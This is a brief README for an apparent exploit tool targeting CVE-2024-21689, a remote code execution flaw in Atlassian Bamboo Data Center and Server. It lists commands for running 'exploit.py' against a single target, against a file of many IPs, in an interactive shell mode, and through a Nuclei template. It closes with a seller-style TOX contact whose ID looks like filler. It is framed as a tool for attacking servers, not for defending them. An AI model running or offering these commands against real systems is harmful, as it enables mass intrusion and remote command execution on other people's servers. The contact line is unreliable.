#CVE-2024–21689 RCE Bamboo Data Center and Server Atlassian

## CVSS Score - 7.6 🔥

## Description
This High severity RCE (Remote Code Execution) vulnerability CVE-2024-21689  was introduced in versions 9.1.0, 9.2.0, 9.3.0, 9.4.0, 9.5.0, and 9.6.0 of Bamboo Data Center and Server. This RCE (Remote Code Execution) vulnerability, with a CVSS Score of 7.6, allows an authenticated attacker to execute arbitrary code which has high impact to confidentiality, high impact to integrity, high impact to availability, and requires user interaction.

### Running the Script

- **Single URL Mode**:
  ```bash
  python3 exploit.py -u http://<target-ip>:8090 -c "whoami"
  ```
- **File Mode** (for multiple IPs):
  ```bash
  python3 exploit.py -f ips.txt -c "whoami"
  ```
- **Interactive Shell Mode**:
  ```bash
  python3 exploit.py -u http://<target-ip>:8090 --shell
  ```
- **Nuclei**:
  ```bash
  nuclei exploit.yaml -f file.txt
  ```

## Contact

Contact me in TOX: 6FDB3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0TQDQ2
